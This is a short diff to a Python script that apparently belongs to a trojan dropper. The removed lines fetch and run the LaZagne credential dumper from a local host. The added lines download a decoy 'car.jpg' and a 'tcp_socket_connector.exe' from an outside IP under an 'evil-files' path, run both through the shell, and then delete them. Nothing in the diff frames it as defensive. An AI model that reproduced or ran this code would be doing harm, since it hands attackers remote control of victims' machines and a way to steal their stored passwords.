@@ -10,6 +10,12 @@ def download(url):
 
 temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
-download("http://192.168.0.101/evil-files/laZagne.exe")
-result = subprocess.check_output("laZagne.exe all", shell=True)
-os.remove("laZagne.exe")
+
+download("http://31.28.252.133/evil-files/car.jpg")
+subprocess.Popen("car.jpg", shell=True)
+
+download("http://31.28.252.133/evil-files/tcp_socket_connector.exe")
+subprocess.call("tcp_socket_connector.exe", shell=True)
+
+os.remove("car.jpg")
+os.remove("tcp_socket_connector.exe")
